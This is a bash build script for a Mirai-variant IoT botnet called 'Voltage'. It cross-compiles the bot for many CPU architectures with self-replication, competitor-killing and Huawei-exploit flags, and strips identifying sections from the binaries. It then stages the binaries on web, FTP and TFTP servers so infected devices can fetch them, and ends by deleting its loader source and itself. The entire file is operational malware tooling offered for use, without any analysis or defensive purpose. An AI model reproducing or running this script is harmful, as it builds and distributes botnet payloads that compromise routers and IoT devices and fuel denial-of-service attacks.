#!/bin/bash
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/x86_64/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/i686/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/powerpc-44S.fp/bin
export PATH=$PATH:/etc/xcompile/mips64/bin
export PATH=$PATH:/etc/xcompile/armv4eb/bin
export PATH=$PATH:/etc/xcompile/armv4tl/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/i486/bin
export PATH=$PATH:/etc/xcompile/arc/bin

export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords

function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

function arc_compile {
    "$1-linux-gcc" -DMIRAI_BOT_ARCH="$3" bot/*.c -s -o release/"$2"
}

rm -rf ~/release
mkdir ~/release
rm -rf /var/www/html
rm -rf /var/lib/tftpboot
rm -rf /var/ftp
mkdir /var/ftp
mkdir /var/lib/tftpboot
mkdir /var/www/html
mkdir /var/www/html/bins

echo "<center>*************************<br>Shine private version<br>*************************</center>" >> /var/www/html/index.html
echo "<center>*************************<br>Shine private version<br>*************************</center>" >> /var/www/html/bins/index.html
compile_bot i586 Voltage.x86 "-static -DKILLER -DHUAWEI -DSELFREP -w"
compile_bot mips Voltage.mips "-static -DKILLER -DHUAWEI -DSELFREP -w"
compile_bot mipsel Voltage.mpsl "-static -DKILLER -DHUAWEI -DSELFREP -w"
compile_bot armv4l Voltage.arm "-static -DKILLER -DHUAWEI -DSELFREP -w"
compile_bot armv5l Voltage.arm5 "-static -DKILLER -DHUAWEI -DSELFREP -w"
compile_bot armv6l Voltage.arm6 "-static -DKILLER -DHUAWEI -DSELFREP -w"
compile_bot armv7l Voltage.arm7 "-static -DKILLER -DHUAWEI -DSELFREP -w"
compile_bot powerpc Voltage.ppc "-static -DKILLER -DHUAWEI -DSELFREP -w"
compile_bot sparc Voltage.spc "-static -DKILLER -DHUAWEI -DSELFREP -w"
compile_bot m68k Voltage.m68k "-static -DKILLER -DHUAWEI -DSELFREP -w"
compile_bot sh4 Voltage.sh4 "-static -DKILLER -DHUAWEI -DSELFREP -w"



cp release/d* /root/


cp release/Voltage.* /var/www/html/bins
cp release/Voltage.* /var/ftp
mv release/Voltage.* /var/lib/tftpboot
rm -rf release

rm -rf ~/loader/src ~/dlr ~/scanListen.go ~/build.sh


